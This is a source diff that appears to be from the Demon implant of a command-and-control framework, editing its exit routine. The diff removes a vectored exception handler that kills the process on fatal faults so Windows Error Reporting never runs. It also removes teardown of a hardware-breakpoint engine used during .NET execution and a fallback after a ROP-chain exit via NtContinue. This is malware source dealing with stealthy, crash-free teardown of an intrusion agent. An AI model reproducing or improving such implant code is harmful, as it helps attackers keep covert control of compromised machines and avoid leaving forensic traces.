@@ -12,39 +12,6 @@
 #include <core/Kerberos.h>
 #include <core/CoffeeLdr.h>
 #include <inject/Inject.h>
-#include <core/HwBpEngine.h>
-
-/*
- * Exit crash guard — prevents APPCRASH / WER when cleanup faults.
- *
- * During CommandExit() the agent tears down sockets, jobs, tokens, etc.
- * If any step triggers an access violation (stale handle, freed memory,
- * heap corruption from a killed job thread), Windows invokes WER which
- * allocates non-paged pool for crash-dump processing.  That pool is not
- * released quickly; subsequent agents on the same host fail with
- * WSAENOBUFS (os error 10055).
- *
- * Fix: register a first-chance VEH handler before cleanup starts.
- * On fatal exception codes, the handler calls NtTerminateProcess
- * directly — a clean exit that skips WER entirely.
- */
-static NTSTATUS ( NTAPI *g_ExitGuardNtTerminateProcess )( HANDLE, NTSTATUS ) = NULL;
-
-static LONG NTAPI ExitCrashGuardHandler( struct _EXCEPTION_POINTERS *ExceptionInfo )
-{
-    DWORD Code = ExceptionInfo->ExceptionRecord->ExceptionCode;
-
-    if ( Code == 0xC0000005 /* STATUS_ACCESS_VIOLATION          */ ||
-         Code == 0xC0000006 /* STATUS_IN_PAGE_ERROR             */ ||
-         Code == 0xC00000FD /* STATUS_STACK_OVERFLOW            */ ||
-         Code == 0xC0000374 /* STATUS_HEAP_CORRUPTION           */ ||
-         Code == 0xC0000409 /* STATUS_STACK_BUFFER_OVERRUN      */ )
-    {
-        if ( g_ExitGuardNtTerminateProcess )
-            g_ExitGuardNtTerminateProcess( NtCurrentProcess(), STATUS_SUCCESS );
-    }
-    return EXCEPTION_CONTINUE_SEARCH;
-}
 
 SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_SLEEP,                    .Function = CommandSleep                    },
@@ -3371,18 +3338,6 @@ VOID CommandExit( PPARSER Parser )
     PPIVOT_DATA       SmbPivotEntry = NULL;
     PCOFFEE_KEY_VALUE KeyValueList  = Instance->CoffeKeyValueStore;
     PCOFFEE_KEY_VALUE KeyValueEntry = NULL;
-    PVOID             ExitGuardVeh  = NULL;
-
-    /* Register crash guard before cleanup — any access violation
-     * during teardown triggers NtTerminateProcess instead of APPCRASH/WER. */
-    g_ExitGuardNtTerminateProcess = Instance->Win32.NtTerminateProcess;
-    if ( Instance->Win32.RtlAddVectoredExceptionHandler )
-        ExitGuardVeh = Instance->Win32.RtlAddVectoredExceptionHandler( TRUE, ExitCrashGuardHandler );
-
-    /* Destroy HwBpEngine VEH handler (if active from .NET execution) before
-     * cleanup — prevents conflict with the exit crash guard. */
-    if ( Instance->HwBpEngine )
-        HwBpEngineDestroy( NULL );
 
     if ( Parser )
     {
@@ -3508,12 +3463,6 @@ VOID CommandExit( PPARSER Parser )
     }
 #endif
 
-    /* Remove crash guard — cleanup survived; the ROP/exit path below
-     * is intentional and must not be intercepted. */
-    if ( ExitGuardVeh && Instance->Win32.RtlRemoveVectoredExceptionHandler )
-        Instance->Win32.RtlRemoveVectoredExceptionHandler( ExitGuardVeh );
-    g_ExitGuardNtTerminateProcess = NULL;
-
 #if _WIN64
 
     /* NOTE:
@@ -3543,13 +3492,6 @@ VOID CommandExit( PPARSER Parser )
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.NtContinue( &RopExit, FALSE );
-
-    /* Fallback: if NtContinue returns (ROP chain failed), exit directly
-     * to prevent an unhandled exception → APPCRASH → WER → pool exhaustion. */
-    if ( ExitMethod == 1 )
-        Instance->Win32.RtlExitUserThread( STATUS_SUCCESS );
-    else
-        Instance->Win32.RtlExitUserProcess( STATUS_SUCCESS );
 
 #else
 
